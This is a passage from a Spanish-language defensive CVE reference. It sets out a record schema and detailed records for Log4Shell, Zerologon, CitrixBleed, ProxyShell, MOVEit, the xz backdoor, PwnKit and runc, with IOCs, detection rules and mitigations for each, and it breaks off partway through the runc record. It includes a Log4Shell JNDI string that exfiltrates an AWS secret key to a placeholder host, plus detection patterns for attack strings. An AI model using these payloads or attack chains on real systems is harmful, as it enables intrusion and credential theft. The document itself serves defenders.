---
id: cve_database
tipo: referencia
estabilidad: volatil
consulta_externa: |
  NVD https://nvd.nist.gov · KEV https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  EPSS https://api.first.org/data/v1/epss · Aviso del fabricante (fuente autoritativa de versiones)
snapshot: 2026-07
---

# Base de CVEs — esquema y fichas de referencia

Este módulo **no** es un listado exhaustivo: ese enfoque envejece mal y no enseña a razonar. Contiene (1) el esquema canónico que debe rellenarse para cualquier CVE, (2) fichas completas de arquetipos que cubren las clases de explotación más relevantes, y (3) un índice de vulnerabilidades de alto impacto con sus campos núcleo.

**Antes de usar cualquier dato de aquí operativamente**: verificar versión parcheada en el aviso del fabricante, estado KEV y EPSS actual. Los campos de adversario reflejan reportes públicos hasta el snapshot.

## Esquema canónico

Los 42 campos, en orden. Si un campo no se conoce, se escribe `Desconocido` — **nunca** se rellena por inferencia.

| Bloque | Campos |
|---|---|
| Identificación | Nombre · CVE · Alias · Descripción · Productos afectados · Versiones · Fabricante · Fecha |
| Clasificación | CVSS · CWE · CAPEC |
| Explotabilidad | EPSS · CISA KEV · Exploit público · PoC · Estado de explotación |
| Adversario | Ransomware asociado · Malware asociado · Grupos APT asociados · Actores criminales conocidos |
| Marco | MITRE ATT&CK · MITRE D3FEND · Kill Chain |
| Mecánica | Vector de ataque · Privilegios requeridos · Complejidad · Impacto |
| Consecuencias | Activos comprometidos · Movimiento lateral posible · Escalada posible · Persistencia posible · Robo de credenciales · Exfiltración |
| Observabilidad | IOC · TTP · Detección · Hunting |
| Defensa | Mitigación · Hardening · Respuesta · Recuperación · Referencias |

Regla de calidad: los campos que más valor aportan son **Impacto**, **Estado de explotación**, **Detección** y **Respuesta**. Una ficha con CVSS y sin detección no sirve para operar.

---

## Ficha 1 — Log4Shell

Arquetipo: *vulnerabilidad en librería ubicua; la superficie es cualquier entrada que llegue a un log.*

| Campo | Valor |
|---|---|
| Nombre | Log4Shell |
| CVE | CVE-2021-44228 (cadena posterior: CVE-2021-45046, CVE-2021-45105, CVE-2021-44832) |
| Alias | LogJam4j (no oficial) |
| Descripción | El sustituidor de mensajes de Log4j 2 interpreta `${jndi:...}` dentro de cualquier cadena registrada y realiza una consulta JNDI (LDAP/RMI) a un servidor remoto, cargando y ejecutando una clase controlada por el atacante |
| Productos afectados | Apache Log4j 2 y todo producto Java que lo embeba (miles: VMware Horizon/vCenter, Elasticsearch, Solr, Minecraft, appliances varios) |
| Versiones | 2.0-beta9 – 2.14.1 vulnerables. 2.15.0 mitiga parcialmente; **2.17.1** (Java 8) es la versión objetivo tras la cadena completa |
| Fabricante | Apache Software Foundation |
| Fecha | Divulgación pública 2021-12-09 |
| CVSS | 10.0 Crítico (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`) |
| CWE | CWE-917 (inyección de expression language); relacionadas CWE-502, CWE-20 |
| CAPEC | CAPEC-242 (Code Injection) |
| EPSS | Máximo del catálogo en el snapshot; recalcular |
| CISA KEV | Sí (añadido 2021-12-10) |
| Exploit público | Sí, trivial y masivo |
| PoC | Sí, múltiples |
| Estado de explotación | Explotación masiva desde el día 0; sigue siendo n-day productivo en appliances olvidados |
| Ransomware asociado | Khonsari, TellYouThePass; adoptado por afiliados de Conti |
| Malware asociado | Mirai y Muhstik (botnets), Kinsing, XMRig, balizas Cobalt Strike |
| Grupos APT asociados | Reportes de Microsoft y Mandiant describen uso por actores con nexo iraní y chino. Sin atribución única |
| Actores criminales conocidos | Operadores de botnets de minería, brokers de acceso inicial, afiliados de ransomware |
| MITRE ATT&CK | T1190 → T1059 → T1105 → T1071.001 |
| MITRE D3FEND | Filtrado de tráfico saliente, application control, análisis de conexiones de red por proceso |
| Kill Chain | Delivery → Exploitation → Installation → C2 |
| Vector de ataque | Red. Cualquier campo registrado: `User-Agent`, cabeceras, nombre de usuario en login fallido, campos de formulario, nombres de archivo, mensajes de chat |
| Privilegios requeridos | Ninguno |
| Complejidad | Baja |
| Impacto | RCE con los privilegios del proceso Java |
| Activos comprometidos | Cualquier servidor Java; frecuentemente en DMZ con acceso a red interna |
| Movimiento lateral posible | Sí, desde el host comprometido |
| Escalada posible | Sí, si el proceso Java corre como root/SYSTEM (frecuente en appliances) |
| Persistencia posible | Sí: web shell, servicio, cron, tarea programada |
| Robo de credenciales | Sí: variables de entorno, `application.properties`, credenciales de BD, tokens cloud vía IMDS |
| Exfiltración | Sí. Variante de baja huella: exfiltrar sin RCE usando `${jndi:ldap://host/${env:AWS_SECRET_ACCESS_KEY}}` |
| IOC | Cadenas `${jndi:`, `${lower:`, `${::-j}` y ofuscaciones equivalentes en logs; conexiones LDAP/RMI salientes (389, 1389, 636, 1099) desde servidores de aplicación; procesos hijos de Java (`sh`, `cmd`, `curl`, `wget`) |
| TTP | Escaneo masivo indiscriminado → callback JNDI → descarga de clase → shell o minero; en actores serios, salto directo a herramienta de C2 |
| Detección | Sigma sobre logs de aplicación buscando patrones JNDI ofuscados; **más fiable**: alerta por conexión LDAP/RMI saliente desde un proceso Java, y por proceso hijo anómalo de `java` |
| Hunting | Buscar retroactivamente en logs desde 2021-12-01 cualquier resolución DNS desde servidores de aplicación hacia dominios de callback; inventariar `log4j-core*.jar` en disco con hash, incluidos JAR anidados (`.war`, `.ear`, uber-jars) |
| Mitigación | Actualizar a 2.17.1+. Si es imposible: eliminar `JndiLookup.class` del JAR (`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`). `log4j2.formatMsgNoLookups=true` es insuficiente por sí solo |
| Hardening | Egress denegado por defecto en servidores; los servidores de aplicación no deben poder iniciar conexiones LDAP/RMI arbitrarias a Internet. SBOM que permita responder "¿dónde tengo log4j?" en minutos |
| Respuesta | Asumir compromiso en sistemas expuestos sin parchear en diciembre de 2021. Buscar web shells, mineros y persistencia. Rotar credenciales presentes en el host |
| Recuperación | Reconstruir el sistema si hay evidencia de ejecución; rotar todo secreto accesible desde el proceso |
| Referencias | Aviso de Apache Log4j Security; CISA Alert AA21-356A; NVD CVE-2021-44228 |

---

## Ficha 2 — Zerologon

Arquetipo: *fallo criptográfico que convierte acceso de red sin credenciales en control del dominio.*

| Campo | Valor |
|---|---|
| Nombre | Zerologon |
| CVE | CVE-2020-1472 |
| Alias | Netlogon Elevation of Privilege |
| Descripción | MS-NRPC usa AES-CFB8 con vector de inicialización fijo a ceros. Enviando credenciales de cliente compuestas solo por ceros, ~1 de cada 256 intentos valida. Permite fijar la contraseña de la cuenta de máquina del DC a vacío y actuar como el DC |
| Productos afectados | Windows Server actuando como controlador de dominio |
| Versiones | Windows Server 2008 R2 – 2019 sin la actualización de agosto de 2020; aplicación obligatoria del modo seguro desde febrero de 2021 |
| Fabricante | Microsoft |
| Fecha | Parche 2020-08-11; exploit público 2020-09-11 |
| CVSS | 10.0 Crítico (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`) |
| CWE | CWE-330 (aleatoriedad insuficiente); relacionada CWE-287 |
| CAPEC | CAPEC-233 (Privilege Escalation) |
| EPSS | Alto; recalcular |
| CISA KEV | Sí |
| Exploit público | Sí (Impacket `zerologon`, mimikatz) |
| PoC | Sí |
| Estado de explotación | Explotación activa desde días después del PoC; sigue apareciendo en redes sin parchear |
| Ransomware asociado | Ryuk, Conti |
| Malware asociado | TrickBot, Cobalt Strike, Impacket |
| Grupos APT asociados | CISA (AA20-283A) documentó actores APT encadenando Zerologon con vulnerabilidades de VPN |
| Actores criminales conocidos | WIZARD SPIDER / operadores de Ryuk; múltiples afiliados de RaaS |
| MITRE ATT&CK | T1068 → T1003.006 (DCSync) → T1550.002 → T1486 |
| MITRE D3FEND | Endurecimiento de credenciales, análisis de tráfico de autenticación, aislamiento del plano de administración |
| Kill Chain | Exploitation → Privilege Escalation → Actions on Objectives |
| Vector de ataque | Red — basta conectividad al puerto 445 del DC desde cualquier host del dominio |
| Privilegios requeridos | Ninguno (ni siquiera cuenta de dominio) |
| Complejidad | Baja (segundos de fuerza bruta trivial) |
| Impacto | Compromiso total del dominio |
| Activos comprometidos | Controlador de dominio → todo el bosque |
| Movimiento lateral posible | Sí, ilimitado tras DCSync |
| Escalada posible | Ya es el máximo privilegio |
| Persistencia posible | Sí: Golden Ticket, cuenta de administrador oculta, ACL modificada, DCShadow |
| Robo de credenciales | Sí — volcado completo de NTDS.dit vía DCSync |
| Exfiltración | Sí, con credenciales de dominio |
| IOC | Evento 4742 sobre la cuenta de máquina del DC (`DC$`) con cambio de contraseña desde un origen inesperado; ráfaga de intentos Netlogon fallidos; eventos 5827–5831 tras el hardening |
| TTP | Explotar → DCSync → Pass-the-Hash a hosts clave → despliegue de ransomware por GPO o PsExec |
| Detección | 4742 con `Account Name` = cuenta de máquina de un DC; 4624 tipo 3 desde un host no administrativo hacia el DC seguido de 4662 con GUID de replicación (`DS-Replication-Get-Changes`); eventos 5829 (conexión vulnerable permitida) durante el periodo de transición |
| Hunting | Buscar cualquier 4662 con derechos de replicación de directorio desde cuentas que no sean DC ni cuentas de sincronización autorizadas — es una de las consultas de mayor valor y menor ruido en AD |
| Mitigación | Actualización acumulativa aplicada y modo de aplicación obligatorio activo (`FullSecureChannelProtection`). Verificar que no queden excepciones configuradas para dispositivos legacy |
| Hardening | Tiering administrativo, restricción de qué hosts pueden hablar con los DC, monitorización de derechos de replicación, cuentas de servicio sin privilegios de replicación |
| Respuesta | Si hubo explotación: asumir compromiso del dominio. Doble reset de `krbtgt`, reset de la contraseña de la cuenta de máquina del DC, revisión de ACL del dominio, búsqueda de persistencia en AD |
| Recuperación | Reconstrucción del plano de identidad si hay evidencia de DCSync. Ver [playbooks/active_directory.md](playbooks/active_directory.md) |
| Referencias | MSRC CVE-2020-1472; Secura whitepaper Zerologon; CISA AA20-283A |

---

## Ficha 3 — CitrixBleed

Arquetipo: *una simple lectura de memoria en el borde equivale a saltarse el MFA. El parche no expulsa al atacante.*

| Campo | Valor |
|---|---|
| Nombre | CitrixBleed |
| CVE | CVE-2023-4966 |
| Alias | Citrix Bleed |
| Descripción | Lectura fuera de límites en el endpoint de descubrimiento OpenID Connect: una petición con un `Host` sobredimensionado devuelve memoria adyacente del proceso, que contiene tokens de sesión válidos. Reutilizar el token da una sesión autenticada **sin credenciales y sin MFA** |
| Productos afectados | NetScaler ADC y NetScaler Gateway (antes Citrix ADC/Gateway) configurados como Gateway o servidor virtual AAA |
| Versiones | Ramas 14.1, 13.1, 13.0, 13.1-FIPS y 12.1 anteriores a las compilaciones corregidas de octubre de 2023. 12.1 estaba en fin de vida y no recibió corrección |
| Fabricante | Citrix / Cloud Software Group |
| Fecha | Aviso 2023-10-10; explotación observada desde agosto de 2023 |
| CVSS | 9.4 Crítico (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`) |
| CWE | CWE-119 (lectura fuera de límites del búfer) |
| CAPEC | CAPEC-540 (lectura de memoria del proceso) |
| EPSS | Muy alto; recalcular |
| CISA KEV | Sí |
| Exploit público | Sí |
| PoC | Sí |
| Estado de explotación | Explotación masiva; base de múltiples brechas de alto perfil |
| Ransomware asociado | LockBit 3.0 (usado en intrusiones de gran visibilidad), Medusa |
| Malware asociado | Herramientas de acceso remoto legítimas usadas de forma abusiva (AnyDesk, Atera), Cobalt Strike, túneles SSH inversos |
| Grupos APT asociados | Actividad de espionaje reportada por proveedores de IR además de la criminal; sin atribución consolidada |
| Actores criminales conocidos | Afiliados de LockBit, brokers de acceso inicial |
| MITRE ATT&CK | T1190 → T1550.004 (secuestro de sesión web) → T1078 → T1021 |
| MITRE D3FEND | Análisis de sesión de usuario, correlación de sesión con geolocalización y dispositivo, invalidación de credenciales |
| Kill Chain | Exploitation → Installation (sesión válida) → Actions on Objectives |
| Vector de ataque | Red, sin autenticación previa |
| Privilegios requeridos | Ninguno |
| Complejidad | Baja |
| Impacto | Secuestro de sesión autenticada, salto completo de MFA |
| Activos comprometidos | Gateway → red interna a través de la VPN/ICA |
| Movimiento lateral posible | Sí — el atacante entra como un usuario legítimo remoto |
| Escalada posible | Sí, dependiendo del usuario suplantado (a menudo se roban sesiones de administradores) |
| Persistencia posible | Sí: creación de cuentas, herramientas RMM, tareas programadas dentro de la red |
| Robo de credenciales | Indirecto: se roba la sesión, no la credencial. Después, volcado interno estándar |
| Exfiltración | Sí, tras el acceso interno |
| IOC | Peticiones a `/oauth/idp/.well-known/openid-configuration` con cabecera `Host` anormalmente larga; sesiones con el mismo identificador desde IP y user-agent distintos; conexiones desde ASN de VPS/proxies residenciales |
| TTP | Explotar → reutilizar token → reconocimiento AD (`net`, `AdFind`) → volcado de credenciales → despliegue de RMM → exfiltración → ransomware |
| Detección | Correlacionar sesión activa con cambio brusco de IP/geografía/agente; alertar sobre logins de gateway sin evento de autenticación previo correspondiente; en el appliance, revisar `ns.log` por peticiones anómalas al endpoint OIDC |
| Hunting | Enumerar todas las sesiones activas del gateway y contrastarlas con eventos de autenticación completos; toda sesión sin su login correspondiente es sospechosa |
| Mitigación | Actualizar a la compilación corregida **y a continuación terminar todas las sesiones activas**: `kill icaconnection -all`, `kill aaa session -all`, `kill pcoipConnection -all`, `clear lb persistentSessions`. Omitir este paso deja al atacante dentro con un sistema ya parcheado |
| Hardening | No exponer la interfaz de administración; MFA con verificación de dispositivo; ligar la sesión a la IP de origen cuando el caso de uso lo permita; retirar versiones en fin de vida |
| Respuesta | Revisar logs desde agosto de 2023; buscar cuentas creadas, RMM instalados, actividad AD anómala; rotar credenciales de los usuarios cuyas sesiones pudieran haberse robado |
| Recuperación | Reimagen del appliance si hay indicios de acceso al sistema; rotación de secretos del gateway |
| Referencias | Aviso Citrix CTX579459; CISA AA23-325A; análisis de Mandiant |

---

## Ficha 4 — ProxyShell

Arquetipo: *cadena de tres vulnerabilidades; ninguna basta sola. Enseña a razonar en cadenas.*

| Campo | Valor |
|---|---|
| Nombre | ProxyShell |
| CVE | CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207 |
| Alias | — |
| Descripción | Confusión de ruta pre-autenticación en Autodiscover permite alcanzar el backend de Exchange PowerShell (34473); elevación de privilegios en ese backend (34523); escritura arbitraria de archivos mediante exportación de buzón a PST (31207), que se usa para dejar un web shell |
| Productos afectados | Microsoft Exchange Server on-premises |
| Versiones | Exchange 2013, 2016 y 2019 sin las actualizaciones acumulativas de abril y mayo de 2021 |
| Fabricante | Microsoft |
| Fecha | Parches abril–mayo 2021; explotación masiva desde agosto de 2021 |
| CVSS | 9.8 / 9.0 / 7.2 según componente |
| CWE | CWE-918 (SSRF), CWE-269 (gestión de privilegios), CWE-22 (path traversal) |
| CAPEC | CAPEC-664, CAPEC-233, CAPEC-126 |
| EPSS | Alto; recalcular |
| CISA KEV | Sí (los tres) |
| Exploit público | Sí, cadena completa automatizada |
| PoC | Sí |
| Estado de explotación | Explotación masiva histórica; los servidores Exchange sin parchear siguen siendo objetivo |
| Ransomware asociado | LockFile, Conti, BlackByte, Babuk |
| Malware asociado | Web shells (China Chopper y variantes ASPX), Cobalt Strike, Squirrelwaffle |
| Grupos APT asociados | Numerosos actores estatales adoptaron la cadena. Nota: HAFNIUM se asocia a **ProxyLogon** (CVE-2021-26855, marzo 2021), no a ProxyShell |
| Actores criminales conocidos | Afiliados de ransomware y brokers de acceso |
| MITRE ATT&CK | T1190 → T1505.003 (web shell) → T1114 (recolección de correo) → T1078 |
| MITRE D3FEND | Análisis de integridad de archivos, análisis de creación de proceso, aislamiento del servidor de correo |
| Kill Chain | Exploitation → Installation → C2 → Actions on Objectives |
| Vector de ataque | Red, HTTPS al servidor Exchange expuesto |
| Privilegios requeridos | Ninguno |
| Complejidad | Baja con exploit público |
| Impacto | RCE como SYSTEM en el servidor Exchange |
| Activos comprometidos | Servidor Exchange (habitualmente unido al dominio y con privilegios elevados en AD) |
| Movimiento lateral posible | Sí — Exchange es un pivote privilegiado hacia AD |
| Escalada posible | Sí, hasta administrador de dominio en configuraciones heredadas de permisos de Exchange |
| Persistencia posible | Sí: web shells, buzones con reglas maliciosas, cuentas nuevas, permisos de aplicación |
| Robo de credenciales | Sí: volcado LSASS en el servidor, más credenciales en el correo |
| Exfiltración | Sí, exportación masiva de buzones a PST |
| IOC | Archivos `.aspx` nuevos en `FrontEnd\HttpProxy\owa\auth\`, `ecp\auth\` y `aspnet_client\`; archivos PST en rutas inusuales; peticiones a `/autodiscover/autodiscover.json` con `@evil.com` y `X-Rps-CAT`; procesos hijos de `w3wp.exe` (`cmd`, `powershell`, `csc`) |
| TTP | Escaneo → cadena de explotación → web shell → reconocimiento → volcado de credenciales → movimiento lateral → exfiltración/ransomware |
| Detección | Alertar sobre cualquier proceso hijo de `w3wp.exe`; monitorizar creación de archivos en directorios virtuales de Exchange; revisar logs IIS por peticiones a Autodiscover con parámetros de correo anómalos |
| Hunting | Inventariar todos los `.aspx` de los directorios de Exchange y comparar con una instalación limpia de la misma CU; revisar cmdlets `New-MailboxExportRequest` en los logs de administración |
| Mitigación | Aplicar la CU y SU vigentes; Exchange requiere estar en una CU soportada para poder recibir parches de seguridad |
| Hardening | No exponer OWA/ECP directamente: publicar tras un proxy con autenticación previa; desactivar Exchange PowerShell remoto para usuarios; migrar fuera de Exchange on-premises cuando sea viable; reducir los permisos heredados de Exchange sobre AD |
| Respuesta | Ver [playbooks/exchange.md](playbooks/exchange.md). Buscar web shells antes de parchear; el parche no elimina el shell |
| Recuperación | Reconstruir el servidor si hubo SYSTEM; rotar credenciales de servicio y contraseñas de cuentas cuyos buzones se exportaron |
| Referencias | Boletines MSRC de abril y mayo de 2021; CISA AA21-{alertas de Exchange}; análisis de Unit42 y Huntress |

---

## Ficha 5 — MOVEit Transfer

Arquetipo: *extorsión masiva sin cifrado; un solo producto compromete miles de organizaciones por efecto de agregación.*

| Campo | Valor |
|---|---|
| Nombre | MOVEit Transfer SQL Injection |
| CVE | CVE-2023-34362 (seguidas por CVE-2023-35036 y CVE-2023-35708) |
| Alias | — |
| Descripción | Inyección SQL sin autenticación en la aplicación web de MOVEit Transfer que permite manipular la base de datos y desemboca en ejecución de código y despliegue de un web shell (`human2.aspx`, LEMURLOOT) para robar credenciales y descargar los archivos almacenados |
| Productos afectados | Progress MOVEit Transfer (y MOVEit Cloud) |
| Versiones | Todas las anteriores a las compilaciones corregidas de mayo-junio de 2023 |
| Fabricante | Progress Software |
| Fecha | Aviso 2023-05-31; explotación observada desde el 27 de mayo de 2023 |
| CVSS | 9.8 Crítico |
| CWE | CWE-89 (inyección SQL) |
| CAPEC | CAPEC-66 |
| EPSS | Alto; recalcular |
| CISA KEV | Sí |
| Exploit público | Sí |
| PoC | Sí |
| Estado de explotación | Campaña masiva coordinada; miles de organizaciones afectadas por efecto cascada de terceros |
| Ransomware asociado | Cl0p — **sin cifrado**: solo robo y extorsión |
| Malware asociado | LEMURLOOT / `human2.aspx` (web shell a medida para MOVEit) |
| Grupos APT asociados | Ninguno; operación criminal |
| Actores criminales conocidos | Cl0p (solapamiento con FIN11 / TA505; Microsoft lo rastrea como Lace Tempest) |
| MITRE ATT&CK | T1190 → T1505.003 → T1213 → T1567 |
| MITRE D3FEND | Análisis de integridad de archivos, restricción de egress, detección de transferencia anómala de volumen |
| Kill Chain | Exploitation → Installation → Collection → Exfiltration |
| Vector de ataque | Red, interfaz web expuesta a Internet |
| Privilegios requeridos | Ninguno |
| Complejidad | Baja |
| Impacto | Robo de todos los archivos y credenciales gestionados por la plataforma |
| Activos comprometidos | Servidor MOVEit y **todos los datos de terceros** que transitaban por él |
| Movimiento lateral posible | Sí, aunque el objetivo principal fue el dato en reposo |
| Escalada posible | Sí, a nivel del servicio |
| Persistencia posible | Sí, vía web shell |
| Robo de credenciales | Sí: cuentas de la plataforma y claves de almacenamiento (incluidas credenciales de Azure Blob) |
| Exfiltración | Sí, objetivo primario |
| IOC | Presencia de `human2.aspx` o `.cmdline` en `wwwroot`; cuentas nuevas con nombres aleatorios en la base de MOVEit; descargas masivas en poco tiempo desde una IP única |
| TTP | Explotación automatizada masiva → web shell → enumeración de la base → descarga masiva → publicación en sitio de filtraciones semanas después |
| Detección | Monitorizar creación de archivos en el webroot; alertar sobre volumen de descarga anómalo por cuenta; revisar la tabla de usuarios por altas no justificadas |
| Hunting | Buscar `human2.aspx` y variantes; revisar logs IIS desde el 2023-05-27; comparar volumen de transferencia con la línea base histórica |
| Mitigación | Actualizar a la versión corregida; hasta entonces, bloquear el tráfico HTTP/HTTPS entrante al servicio |
| Hardening | No exponer plataformas MFT directamente: proxy con autenticación previa; cifrado de archivos en reposo con claves que la aplicación no posea; retención mínima (lo que no está almacenado no se puede robar); segmentación del servidor MFT |
| Respuesta | Asumir exfiltración si estuvo expuesto en la ventana; identificar exactamente qué archivos residían en la plataforma; activar notificación a terceros afectados |
| Recuperación | Reconstruir el servidor; rotar todas las credenciales y claves de almacenamiento; gestionar la notificación regulatoria y contractual |
| Referencias | Aviso de Progress; CISA AA23-158A; análisis de Mandiant sobre LEMURLOOT |

---

## Ficha 6 — Backdoor en xz-utils

Arquetipo: *compromiso de la cadena de suministro mediante ingeniería social sobre el mantenedor. El código malicioso es legítimo por construcción.*

| Campo | Valor |
|---|---|
| Nombre | Backdoor de xz-utils / liblzma |
| CVE | CVE-2024-3094 |
| Alias | Jia Tan backdoor |
| Descripción | Un contribuidor que ganó permisos de mantenimiento durante ~2 años introdujo, en los tarballs de release (no en el repositorio git), un objeto de prueba que durante el build inyecta código en `liblzma`. Mediante un resolvedor IFUNC engancha `RSA_public_decrypt` en `sshd` (enlazado a liblzma a través de `libsystemd` en distribuciones con integración systemd), permitiendo ejecución de comandos previa a la autenticación a quien posea la clave privada correcta |
| Productos afectados | xz-utils / liblzma, y por extensión `sshd` en distribuciones que enlazan con libsystemd |
| Versiones | 5.6.0 y 5.6.1. Distribuciones estables mayoritariamente no afectadas; sí ramas inestables (Debian sid, Fedora Rawhide/40 beta, openSUSE Tumbleweed, Kali en una ventana concreta) |
| Fabricante | Proyecto de código abierto |
| Fecha | Descubierto 2024-03-29 por Andres Freund a partir de una anomalía de ~500 ms en el tiempo de login de SSH |
| CVSS | 10.0 Crítico |
| CWE | CWE-506 (código malicioso embebido); relacionada CWE-1357 (dependencia de componente de terceros) |
| CAPEC | CAPEC-441 (Malicious Logic Insertion), CAPEC-437 (Supply Chain) |
| EPSS | Bajo pese al CVSS 10.0 — no hubo explotación masiva. Ejemplo canónico de por qué EPSS y CVSS miden cosas distintas |
| CISA KEV | No — no se confirmó explotación en el mundo real antes de la detección |
| Exploit público | La puerta trasera requiere una clave privada ED448 que solo posee el autor; existen análisis y herramientas de detección públicas |
| PoC | Análisis públicos del mecanismo; no un exploit usable por terceros |
| Estado de explotación | Sin explotación confirmada. Detectado antes de llegar a distribuciones estables |
| Ransomware asociado | Ninguno |
| Malware asociado | El propio implante |
| Grupos APT asociados | No atribuido públicamente. El patrón —dos años de presión social sostenida sobre un mantenedor único y agotado— es consistente con un actor con recursos y paciencia estatal |
| Actores criminales conocidos | Persona "Jia Tan" y cuentas de presión asociadas; identidad real desconocida |
| MITRE ATT&CK | T1195.001/.002 (compromiso de la cadena de suministro de software) → T1554 → T1078 |
| MITRE D3FEND | Verificación de integridad de artefactos, build reproducible, análisis de comportamiento de proceso |
| Kill Chain | Weaponization → Delivery (a través del canal de distribución legítimo) |
| Vector de ataque | Red, contra el servicio SSH del sistema comprometido |
| Privilegios requeridos | Ninguno para el poseedor de la clave |
| Complejidad | Alta de construir; trivial de usar para su autor |
| Impacto | RCE previa a la autenticación como root |
| Activos comprometidos | Cualquier servidor Linux con la versión afectada |
| Movimiento lateral posible | Sí, con acceso root |
| Escalada posible | Ya entra como root |
| Persistencia posible | La propia puerta trasera es la persistencia, y sobrevive a la rotación de credenciales |
| Robo de credenciales | Sí, control total del host |
| Exfiltración | Sí |
| IOC | Versión 5.6.0/5.6.1 de xz instalada; `sshd` que enlaza `liblzma`; latencia anómala en el login SSH; script de detección de la comunidad basado en la firma de bytes del objeto inyectado |
| TTP | Ingeniería social de largo plazo sobre gobernanza del proyecto → inyección en el tarball de release y no en git → ocultación en archivos de prueba binarios → activación condicionada al entorno de build de las distribuciones objetivo |
| Detección | Verificación de versión del paquete; comparación entre el árbol git y el tarball distribuido; detección de enlace inesperado de `sshd` con liblzma |
| Hunting | Inventariar versiones de xz en toda la flota, incluidas imágenes de contenedor y sistemas de build. Revisar quién ejecutó builds con esas versiones |
| Mitigación | Degradar a 5.4.x o a la versión corregida por la distribución |
| Hardening | Builds reproducibles; construir desde git y no desde tarballs; SBOM con procedencia; SLSA nivel 3+; política de al menos dos revisores para cambios en dependencias críticas; **atención a la salud de los mantenedores** como control de seguridad real |
| Respuesta | Si hubo versión afectada expuesta: reconstruir el host y rotar claves. La puerta trasera no deja rastro en logs |
| Recuperación | Reimagen desde medio confiable |
| Referencias | Anuncio original de Andres Freund en oss-security; análisis de Openwall y de la comunidad; avisos de las distribuciones |

---

## Ficha 7 — PwnKit

Arquetipo: *escalada local en un binario setuid presente en prácticamente todo Linux durante 12 años.*

| Campo | Valor |
|---|---|
| Nombre | PwnKit |
| CVE | CVE-2021-4034 |
| Alias | — |
| Descripción | `pkexec` de polkit no maneja el caso `argc == 0`, lo que provoca una escritura fuera de límites en el array de entorno reconstruido y permite reintroducir variables de entorno controladas (como `GCONV_PATH`) para cargar una biblioteca compartida arbitraria como root |
| Productos afectados | polkit (`pkexec`), presente por defecto en la mayoría de distribuciones Linux |
| Versiones | Desde la introducción de `pkexec` en 2009 hasta las versiones corregidas de enero de 2022 |
| Fabricante | freedesktop / polkit; empaquetado por cada distribución |
| Fecha | Publicado 2022-01-25 por Qualys |
| CVSS | 7.8 Alto (`AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) |
| CWE | CWE-787 (escritura fuera de límites) |
| CAPEC | CAPEC-233 |
| EPSS | Medio-alto; recalcular |
| CISA KEV | Sí |
| Exploit público | Sí, exploits fiables y universales |
| PoC | Sí, en múltiples lenguajes |
| Estado de explotación | Ampliamente incorporado como módulo de escalada local en intrusiones y botnets |
| Ransomware asociado | Usado en intrusiones de ransomware sobre Linux/ESXi como paso de escalada |
| Malware asociado | Botnets de minería (Kinsing y similares), scripts de post-explotación |
| Grupos APT asociados | Sin atribución específica: es una herramienta genérica de escalada |
| Actores criminales conocidos | Operadores de criptominería, afiliados de ransomware |
| MITRE ATT&CK | T1068 (explotación para escalada de privilegios) |
| MITRE D3FEND | Análisis de creación de proceso, hardening de permisos de ejecutables |
| Kill Chain | Privilege Escalation (posterior al acceso inicial) |
| Vector de ataque | Local — requiere ejecución previa como cualquier usuario sin privilegios |
| Privilegios requeridos | Usuario local sin privilegios |
| Complejidad | Baja; explotación determinista, sin condiciones de carrera |
| Impacto | Root |
| Activos comprometidos | El host Linux completo |
| Movimiento lateral posible | Indirectamente, tras obtener root y credenciales |
| Escalada posible | Sí, es su propósito |
| Persistencia posible | Sí, una vez root |
| Robo de credenciales | Sí: claves SSH, `/etc/shadow`, tokens de servicio, secretos de contenedores en el host |
| Exfiltración | Sí, tras root |
| IOC | Ejecución de `pkexec` sin argumentos; mensajes de polkit en `auth.log`/`journal` con `The value for the SHELL variable was not found the /etc/shells file`; archivos `.so` creados en directorios temporales |
| TTP | Acceso inicial (web shell, credencial, contenedor) → PwnKit → root → persistencia y credenciales |
| Detección | auditd sobre `execve` de `pkexec` con `argc==0`; alerta sobre `pkexec` invocado por procesos de servicio web o por usuarios de aplicación que no deberían usarlo |
| Hunting | Buscar cualquier ejecución de `pkexec` desde contextos no interactivos (`www-data`, `nobody`, procesos de contenedor) |
| Mitigación | Actualizar el paquete polkit. Mitigación temporal si no hay parche: `chmod 0755 /usr/bin/pkexec` (retirar el bit setuid) |
| Hardening | Auditar e inventariar todos los binarios setuid del sistema y eliminar los innecesarios; contenedores con `no-new-privileges`; perfiles seccomp/AppArmor |
| Respuesta | Si hay evidencia de uso: tratar el host como comprometido a nivel root |
| Recuperación | Reimagen del host; rotación de todas las claves y credenciales que residían en él |
| Referencias | Aviso de seguridad de Qualys sobre PwnKit; avisos de las distribuciones; NVD CVE-2021-4034 |

---

## Ficha 8 — Leaky Vessels (runc)

Arquetipo: *escape de contenedor por fuga de descriptor de archivo; rompe el supuesto de aislamiento de toda la plataforma.*

| Campo | Valor |
|---|---|
| Nombre | Leaky Vessels — escape de contenedor en runc |
| CVE | CVE-2024-21626 |
| Alias | Leaky Vessels |
| Descripción | Descriptores de archivo del espacio de nombres del host quedan filtrados al proceso del contenedor. Fijando el directorio de trabajo a `/proc/self/fd/N`, el proceso del contenedor accede al sistema de archivos del host y escapa del aislamiento |
| Productos afectados | runc y todo lo que lo use: Docker, containerd, Kubernetes, plataformas de build de imágenes |
| Versiones | runc ≤ 1.1.11; corregido en 1.1.12 |
| Fabricante | Open Container Initiative / runc |
| Fecha | Publicado 2024-01-31 (Snyk) |
| CVSS | 8.6 Alto |
| CWE | CWE-403 (exposición de descriptor de archivo a un ámbito de control no previsto) |
| CAPEC | CAPEC-233 |
| EPSS | Bajo-medio; recalcular |
| CISA KEV | No en el snapshot |
| Exploit público | Sí, PoC publicados |
| PoC | Sí |
| Estado de explotación | Sin campaña masiva confirmada; relevante sobre todo en entornos multi-inquilino y de build |
| Ransomware asociado | Ninguno confirmado |
| Malware asociado | Herramientas de escape en kits de post-explotación de contenedores |
| Grupos APT asociados | Ninguno confirmado |
| Actores criminales conocidos | Operadores de criptominería en clusters expuestos |
| MITRE ATT&CK | T1611 (escape al host) → T1610 → T1552.007 |
| MITRE D3FEND | Aislamiento de ejecución, análisis de llamadas al sistema, hardening de la plataforma de contenedores |
| Kill Chain | Privilege Escalation / Lateral Movement |
